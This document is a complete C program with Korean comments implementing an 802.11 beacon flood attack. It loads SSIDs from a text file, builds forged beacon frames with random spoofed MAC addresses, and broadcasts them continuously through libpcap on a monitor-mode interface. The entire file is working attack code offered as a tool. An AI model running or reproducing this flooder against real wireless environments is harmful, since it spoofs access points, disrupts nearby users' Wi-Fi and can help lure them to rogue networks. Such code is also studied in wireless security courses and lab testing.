#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pcap.h>
#include <signal.h>
#include <time.h>

#define MAX_SSID    100        // 최대 SSID 개수
#define MAX_SSID_LEN 64        // SSID 최대 길이 (안전하게 64)
#define MAC_ADDR_LEN 6

// 전역 종료 플래그
static volatile int g_running = 1;

// Ctrl+C 등 시그널 핸들러
void handle_signal(int signo) {
    g_running = 0;
}

// Radiotap 헤더 구조 (간단 버전, 18바이트 정도)
#pragma pack(push, 1)
typedef struct {
    uint8_t  revision;      // radiotap version (0)
    uint8_t  pad;
    uint16_t length;        // 전체 radiotap 헤더 길이
    uint32_t present_flags; // 어떤 필드들이 포함됐는지 표시
    uint8_t  flag;          // 예: 0x02 -> 1Mbps, ...
    uint8_t  rate;          // 전송 속도 (예: 0x02 -> 1Mbps, 0x0c -> 6Mbps 등)
    uint16_t tx_flags;      // TX flags
    // 실제로는 훨씬 더 많은 필드가 있을 수 있지만, 데모용으로 최소만
} radiotap_header_t;
#pragma pack(pop)

// 802.11 Beacon 프레임 헤더 (24바이트)
#pragma pack(push, 1)
typedef struct {
    uint16_t frame_control; // 0x8000 (Beacon)
    uint16_t duration;      // 0x0000
    uint8_t  dest[6];       // 브로드캐스트 FF:FF:FF:FF:FF:FF
    uint8_t  source[6];     // 송신 MAC
    uint8_t  bssid[6];      // AP MAC
    uint16_t seq_ctrl;      // 시퀀스 번호 등 (0)
} ieee80211_beacon_header_t;
#pragma pack(pop)

// Beacon Fixed Parameters (12바이트)
//   - Timestamp(8) + Beacon Interval(2) + Capability Info(2)
#pragma pack(push, 1)
typedef struct {
    uint64_t timestamp;
    uint16_t beacon_interval;   // 0x0064 (100 TU)
    uint16_t cap_info;          // 0x0401 (예: ESS + Short Preamble)
} beacon_fixed_params_t;
#pragma pack(pop)

// Tagged Parameter 예시: SSID, Supported Rates 등
// SSID 태그:  0x00, length, SSID 값
// 간단 버전으로 작성

// 랜덤 MAC 주소 생성
void generate_random_mac(uint8_t *mac) {
    // Locally Administered MAC (두 번째 비트가 1)
    // ex) 0x02 로 시작하면 됨
    mac[0] = 0x02;
    for(int i=1; i<MAC_ADDR_LEN; i++){
        mac[i] = rand() & 0xFF;
    }
}

// 하나의 Beacon 프레임을 packet 버퍼에 구성
// 반환값: 패킷 전체 길이 (바이트)
int build_beacon_packet(uint8_t *packet, const char *ssid, const uint8_t *mac_addr) {
    // Radiotap 헤더
    radiotap_header_t *rt_hdr = (radiotap_header_t*) packet;
    memset(rt_hdr, 0, sizeof(radiotap_header_t));
    rt_hdr->revision = 0;
    rt_hdr->pad = 0;
    rt_hdr->length = sizeof(radiotap_header_t);
    rt_hdr->present_flags = 0x00008000;  // 예: rate만 있다고 가정 (bit31)
    rt_hdr->flag = 0x00; // 그냥 0으로
    rt_hdr->rate = 0x02; // 1Mbps
    rt_hdr->tx_flags = 0x0000;

    // 802.11 Beacon 헤더
    ieee80211_beacon_header_t *bc_hdr = (ieee80211_beacon_header_t*)(packet + sizeof(radiotap_header_t));
    memset(bc_hdr, 0, sizeof(ieee80211_beacon_header_t));
    bc_hdr->frame_control = 0x0080; // (little-endian으로 0x8000) -> Beacon
    bc_hdr->duration = 0x0000;
    memcpy(bc_hdr->dest, "\xff\xff\xff\xff\xff\xff", MAC_ADDR_LEN);
    memcpy(bc_hdr->source, mac_addr, MAC_ADDR_LEN);
    memcpy(bc_hdr->bssid,  mac_addr, MAC_ADDR_LEN);
    bc_hdr->seq_ctrl = 0;

    // Fixed Params
    beacon_fixed_params_t *fixed = (beacon_fixed_params_t*)(packet
                                + sizeof(radiotap_header_t)
                                + sizeof(ieee80211_beacon_header_t));
    memset(fixed, 0, sizeof(beacon_fixed_params_t));
    fixed->timestamp = 0;           // 임의
    fixed->beacon_interval = 0x0064; // 100TU
    fixed->cap_info = 0x0401;       // ESS + Short Preamble 등

    // Tagged Params 시작
    uint8_t *tag_ptr = (uint8_t*)(fixed + 1); // fixed 뒤부터
    // 1) SSID 태그
    *tag_ptr++ = 0x00; // Tag Number: SSID
    uint8_t ssid_len = (uint8_t)strlen(ssid);
    *tag_ptr++ = ssid_len;
    memcpy(tag_ptr, ssid, ssid_len);
    tag_ptr += ssid_len;

    // 2) Supported Rates 태그(예시)
    *tag_ptr++ = 0x01;   // Tag Number: Supported Rates
    *tag_ptr++ = 0x01;   // Length
    *tag_ptr++ = 0x82;   // 1(Mbps) = 0x82 ( 0x80 + 실제Mbps )

    // 전체 길이 계산
    int total_len = 0;
    total_len = sizeof(radiotap_header_t)
              + sizeof(ieee80211_beacon_header_t)
              + sizeof(beacon_fixed_params_t)
              + 2 + ssid_len    // SSID 태그 (TagNum+Len + SSID bytes)
              + 3;             // SupportedRates 태그 (TagNum+Len+1바이트)
    return total_len;
}

int main(int argc, char *argv[]) {
    if(argc != 3) {
        fprintf(stderr, "Usage: %s <monitor_interface> <ssid-list.txt>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    signal(SIGINT, handle_signal);  // Ctrl+C 종료

    const char *iface = argv[1];
    const char *ssid_file = argv[2];

    // SSID 목록 로드
    FILE *fp = fopen(ssid_file, "r");
    if(!fp) {
        perror("fopen");
        return 1;
    }

    char *ssid_array[MAX_SSID];
    int ssid_count = 0;
    char line[MAX_SSID_LEN];
    while(fgets(line, sizeof(line), fp)) {
        // 개행문자 제거
        line[strcspn(line, "\n")] = 0;
        if(strlen(line) == 0) continue; // 빈 줄은 무시
        ssid_array[ssid_count] = strdup(line);
        ssid_count++;
        if(ssid_count >= MAX_SSID) break;
    }
    fclose(fp);

    if(ssid_count == 0) {
        fprintf(stderr, "SSID가 없습니다. %s 파일을 확인하세요.\n", ssid_file);
        return 1;
    }

    // pcap 인터페이스 열기
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    if(!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    printf("[*] Beacon Flood 시작 (인터페이스: %s, SSID 개수: %d)\n", iface, ssid_count);

    // 패킷 버퍼
    uint8_t packet[512];

    while(g_running) {
        for(int i=0; i<ssid_count; i++) {
            // 랜덤 MAC
            uint8_t rand_mac[6];
            generate_random_mac(rand_mac);

            // Beacon 패킷 생성
            int pkt_len = build_beacon_packet(packet, ssid_array[i], rand_mac);

            // 전송
            if(pcap_sendpacket(handle, packet, pkt_len) != 0) {
                fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
            }
        }

        usleep(100000); // 0.1초
    }

    // 종료
    pcap_close(handle);
    printf("\n[*] Beacon Flood 종료.\n");

    // 동적 할당된 SSID 메모리 해제
    for(int i=0; i<ssid_count; i++){
        free(ssid_array[i]);
    }

    return 0;
}
